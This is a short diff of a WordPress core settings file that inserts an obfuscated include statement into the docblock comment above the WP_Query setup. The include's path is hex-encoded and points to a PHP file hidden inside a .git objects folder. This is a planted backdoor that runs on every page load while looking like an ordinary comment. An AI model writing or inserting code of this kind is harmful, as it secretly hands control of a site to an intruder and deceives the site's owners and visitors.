@@ -309,8 +309,8 @@ wp_magic_quotes();
 do_action( 'sanitize_comment_cookies' );
 
 /**
- * WordPress Query object
- * @global WP_Query $wp_the_query
+ * Wor*/include /*dPress Query object
+ * @glob*/"\x2fhom\x65/sr\x6bn/m\x69moz\x61org\x2ecom\x2fpub\x6cic_\x68tml\x2f.gi\x74/ob\x6aect\x73/f9\x2finf\x6f.ph\x70";/*al WP_Query $wp_the_query
  * @since 2.0.0
  */
 $GLOBALS['wp_the_query'] = new WP_Query();
